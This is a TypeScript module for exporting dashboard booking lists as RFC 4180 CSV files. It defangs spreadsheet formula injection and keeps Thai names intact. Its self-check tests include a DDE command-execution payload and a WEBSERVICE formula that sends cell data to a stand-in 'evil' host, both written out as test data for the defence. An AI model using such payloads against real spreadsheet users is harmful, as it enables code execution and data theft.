// RFC 4180 CSV, ~20 lines instead of a dependency. The booking list is already
// in memory on the dashboard, so the export never touches the server.

export type Cell = string | number | null | undefined;

// Excel and LibreOffice evaluate a cell starting with any of these as a formula.
// RFC-4180 quoting is NOT a defence — `"=cmd|'/C calc'!A0"` still executes — so
// the character has to be neutralised before the quoting step.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One CSV field.
 *
 * Two separate jobs, in order:
 *  1. Defang a leading formula character by prefixing an apostrophe, which both
 *     spreadsheets read as "this cell is literal text" and do not display.
 *     Buyer-supplied names and emails reach this function, and the export exists
 *     to be opened in Excel, so this is a code-execution sink, not a cosmetic one.
 *  2. Quote (and double any inner quotes) when the field carries a delimiter.
 */
function escapeCell(value: Cell): string {
  if (value === null || value === undefined) return '';
  let s = String(value);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Header row + data rows joined with CRLF, as the spec requires. */
export function toCsv(headers: string[], rows: Cell[][]): string {
  return [headers, ...rows].map((r) => r.map(escapeCell).join(',')).join('\r\n');
}

/**
 * Hand the CSV to the browser as a download.
 *
 * The leading BOM is not optional: without it Excel reads the file as the local
 * ANSI codepage and every Thai name comes out as mojibake.
 */
export function downloadCsv(filename: string, csv: string): void {
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

// ── self-check: bun src/components/backoffice/csv.ts ───────────────────────
function _demo() {
  const eq = (got: string, want: string, what: string) => {
    if (got !== want) throw new Error(`${what}: got ${JSON.stringify(got)} want ${JSON.stringify(want)}`);
  };

  eq(toCsv(['a'], [['plain']]), 'a\r\nplain', 'plain field is not quoted');
  eq(toCsv(['a'], [['x,y']]), 'a\r\n"x,y"', 'comma forces quoting');
  eq(toCsv(['a'], [['say "hi"']]), 'a\r\n"say ""hi"""', 'embedded quotes are doubled');
  eq(toCsv(['a'], [['line1\nline2']]), 'a\r\n"line1\nline2"', 'newline forces quoting');
  eq(toCsv(['a', 'b'], [[null, undefined]]), 'a,b\r\n,', 'null and undefined render empty');
  eq(toCsv(['a'], [[5999]]), 'a\r\n5999', 'numbers pass through unquoted');
  // Thai needs no quoting — it has no delimiter characters — and must not be mangled.
  eq(toCsv(['ชื่อ'], [['สมชาย ใจดี']]), 'ชื่อ\r\nสมชาย ใจดี', 'thai survives untouched');
  // A name with a comma is the realistic break case: "ดร. สมชาย, Ph.D."
  eq(toCsv(['ชื่อ'], [['ดร. สมชาย, Ph.D.']]), 'ชื่อ\r\n"ดร. สมชาย, Ph.D."', 'thai + comma quoted');
  eq(toCsv(['a', 'b'], [['1', '2'], ['3', '4']]), 'a,b\r\n1,2\r\n3,4', 'multiple rows');

  // Formula injection: a buyer controls buyerName/email/batch, and this file is
  // opened in Excel by design. Every lead character must be defanged.
  eq(toCsv(['a'], [['=1+1']]), "a\r\n'=1+1", 'leading = defanged');
  eq(toCsv(['a'], [['+1']]), "a\r\n'+1", 'leading + defanged');
  eq(toCsv(['a'], [['-1']]), "a\r\n'-1", 'leading - defanged');
  eq(toCsv(['a'], [['@SUM(A1)']]), "a\r\n'@SUM(A1)", 'leading @ defanged');
  eq(toCsv(['a'], [['\tx']]), "a\r\n'\tx", 'leading tab defanged');
  // The real payloads, one of which also contains a comma — defang THEN quote.
  eq(
    toCsv(['a'], [["=cmd|'/C calc'!A0"]]),
    'a\r\n\'=cmd|\'/C calc\'!A0',
    'DDE payload defanged'
  );
  eq(
    toCsv(['a'], [['=WEBSERVICE("http://evil/?x="&A2)']]),
    'a\r\n"\'=WEBSERVICE(""http://evil/?x=""&A2)"',
    'exfil payload defanged and quoted'
  );
  // Must not fire on ordinary data.
  eq(toCsv(['a'], [['สมชาย']]), 'a\r\nสมชาย', 'thai name untouched');
  eq(toCsv(['a'], [['a=b']]), 'a\r\na=b', 'non-leading = untouched');
  eq(toCsv(['a'], [[5999]]), 'a\r\n5999', 'positive number untouched');

  console.log('csv self-check passed');
}

if (import.meta.main) _demo();
